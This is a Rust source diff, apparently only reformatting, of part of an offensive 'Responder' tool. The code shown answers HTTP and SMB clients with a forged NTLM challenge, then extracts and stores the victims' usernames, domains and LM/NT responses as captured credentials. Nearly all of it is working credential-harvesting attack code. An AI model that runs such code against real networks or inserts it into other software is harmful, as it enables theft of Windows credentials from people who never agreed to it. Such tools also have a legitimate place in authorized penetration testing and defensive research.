@@ -494,56 +494,56 @@ impl Responder {
             .find(|l| l.starts_with("Authorization:"))
             && let Some(ntlm_data) =
                 parse_http_auth_header(auth_line.trim_start_matches("Authorization:"))
-            {
-                match parse_ntlm_type(&ntlm_data) {
-                    Some(NtlmMessageType::Negotiate) => {
-                        // Send challenge
-                        let challenge_msg = build_ntlm_challenge(challenge, "DOMAIN");
-                        let b64_challenge = base64_encode(&challenge_msg);
+        {
+            match parse_ntlm_type(&ntlm_data) {
+                Some(NtlmMessageType::Negotiate) => {
+                    // Send challenge
+                    let challenge_msg = build_ntlm_challenge(challenge, "DOMAIN");
+                    let b64_challenge = base64_encode(&challenge_msg);
 
-                        let response = format!(
-                            "HTTP/1.1 401 Unauthorized\r\n\
+                    let response = format!(
+                        "HTTP/1.1 401 Unauthorized\r\n\
                              WWW-Authenticate: NTLM {}\r\n\
                              Content-Length: 0\r\n\
                              Connection: close\r\n\
                              \r\n",
-                            b64_challenge
+                        b64_challenge
+                    );
+
+                    stream.write_all(response.as_bytes()).ok();
+                    return Ok(());
+                }
+                Some(NtlmMessageType::Authenticate) => {
+                    // Extract credentials
+                    if let Some(auth) = parse_ntlm_authenticate(&ntlm_data) {
+                        let cred = CapturedCredential {
+                            client_ip,
+                            username: auth.username,
+                            domain: auth.domain,
+                            challenge: bytes_to_hex(&challenge),
+                            lm_response: bytes_to_hex(&auth.lm_response),
+                            nt_response: bytes_to_hex(&auth.nt_response),
+                            protocol: "HTTP".to_string(),
+                            timestamp: chrono::Utc::now(),
+                        };
+
+                        info!(
+                            "Captured NTLM credentials: {}\\{} via HTTP",
+                            cred.domain, cred.username
                         );
 
-                        stream.write_all(response.as_bytes()).ok();
-                        return Ok(());
+                        captured.lock().unwrap().push(cred);
                     }
-                    Some(NtlmMessageType::Authenticate) => {
-                        // Extract credentials
-                        if let Some(auth) = parse_ntlm_authenticate(&ntlm_data) {
-                            let cred = CapturedCredential {
-                                client_ip,
-                                username: auth.username,
-                                domain: auth.domain,
-                                challenge: bytes_to_hex(&challenge),
-                                lm_response: bytes_to_hex(&auth.lm_response),
-                                nt_response: bytes_to_hex(&auth.nt_response),
-                                protocol: "HTTP".to_string(),
-                                timestamp: chrono::Utc::now(),
-                            };
 
-                            info!(
-                                "Captured NTLM credentials: {}\\{} via HTTP",
-                                cred.domain, cred.username
-                            );
-
-                            captured.lock().unwrap().push(cred);
-                        }
-
-                        // Send final response
-                        let response =
-                            "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
-                        stream.write_all(response.as_bytes()).ok();
-                        return Ok(());
-                    }
-                    _ => {}
+                    // Send final response
+                    let response =
+                        "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
+                    stream.write_all(response.as_bytes()).ok();
+                    return Ok(());
                 }
+                _ => {}
             }
+        }
 
         // Request authentication
         let response = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
@@ -647,25 +647,26 @@ impl Responder {
 
         // Extract NTLM authenticate from SMB message
         if let Some(ntlm_data) = Self::extract_ntlm_from_smb(&buf[..len])
-            && let Some(auth) = parse_ntlm_authenticate(&ntlm_data) {
-                let cred = CapturedCredential {
-                    client_ip,
-                    username: auth.username,
-                    domain: auth.domain,
-                    challenge: bytes_to_hex(&challenge),
-                    lm_response: bytes_to_hex(&auth.lm_response),
-                    nt_response: bytes_to_hex(&auth.nt_response),
-                    protocol: "SMB".to_string(),
-                    timestamp: chrono::Utc::now(),
-                };
+            && let Some(auth) = parse_ntlm_authenticate(&ntlm_data)
+        {
+            let cred = CapturedCredential {
+                client_ip,
+                username: auth.username,
+                domain: auth.domain,
+                challenge: bytes_to_hex(&challenge),
+                lm_response: bytes_to_hex(&auth.lm_response),
+                nt_response: bytes_to_hex(&auth.nt_response),
+                protocol: "SMB".to_string(),
+                timestamp: chrono::Utc::now(),
+            };
 
-                info!(
-                    "Captured NTLM credentials: {}\\{} via SMB",
-                    cred.domain, cred.username
-                );
+            info!(
+                "Captured NTLM credentials: {}\\{} via SMB",
+                cred.domain, cred.username
+            );
 
-                captured.lock().unwrap().push(cred);
-            }
+            captured.lock().unwrap().push(cred);
+        }
         Ok(())
     }
 
@@ -715,12 +716,13 @@ impl Responder {
             if &data[i..i + 8] == NTLM_SIGNATURE {
                 // Found NTLM message, try to determine length
                 if let Some(msg_type) = parse_ntlm_type(&data[i..])
-                    && msg_type == NtlmMessageType::Authenticate {
-                        // The authenticate message should be followed by data
-                        // We need to read until we have the full message
-                        // For simplicity, just return what we have
-                        return Some(data[i..].to_vec());
-                    }
+                    && msg_type == NtlmMessageType::Authenticate
+                {
+                    // The authenticate message should be followed by data
+                    // We need to read until we have the full message
+                    // For simplicity, just return what we have
+                    return Some(data[i..].to_vec());
+                }
             }
         }
         None
